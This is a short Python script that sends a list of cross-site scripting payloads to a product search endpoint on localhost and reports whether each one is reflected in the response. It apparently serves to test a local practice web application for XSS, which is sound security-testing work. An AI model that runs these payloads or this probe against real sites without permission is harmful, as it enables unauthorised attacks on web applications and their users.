import requests
import urllib.parse

BASE = "http://localhost:3001"

xss_payloads = [
    "><img src=x onerror=alert(document.domain)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(2)>",
    "javascript:alert(3)",
    "<svg onload=alert(6)>",
    "<iframe src=javascript:alert(8)>",
]

s = requests.Session()

for p in xss_payloads:
    url = f"{BASE}/rest/products/search?q={urllib.parse.quote(p)}"
    r = s.get(url)

    print("Status:", r.status_code)

    if p in r.text:
        print("Reflected input detected (weak signal)")
    else:
        print("Not reflected (does NOT mean safe)")